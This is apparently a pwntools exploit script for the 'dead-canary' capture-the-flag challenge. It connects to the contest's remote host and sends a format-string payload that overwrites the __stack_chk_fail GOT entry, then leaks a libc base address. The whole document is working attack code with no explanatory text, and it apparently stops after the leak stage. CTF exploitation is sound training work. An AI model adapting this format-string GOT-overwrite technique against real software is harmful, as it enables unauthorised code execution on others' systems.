from pwn import *
elf = ELF('./dead-canary', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = elf.process()
p = remote('2020.redpwnc.tf', 31744)
# this payload will overwrite __stack_chk_fail into _init
payload = b''.join([
    cyclic(0x100),
    '%{0:d}x'.format(0x400650-0x100).encode(),b'%40$n',
     b'\x00'*2, p64(elf.got['__stack_chk_fail']),
])

p.sendlineafter(b'name:', payload)
p.interactive() # ctrl+c
p.sendline(cyclic(0x104) + b'%41$p')
libc.address = eval('0x' + p.recvline_contains('0x').strip().decode('latin-1').split('0x')[-1]) - (libc.sym['__libc_start_main']+231)
log.info(f'libc leak 0x{libc.address:x}')

p.interactive()
#libc.address()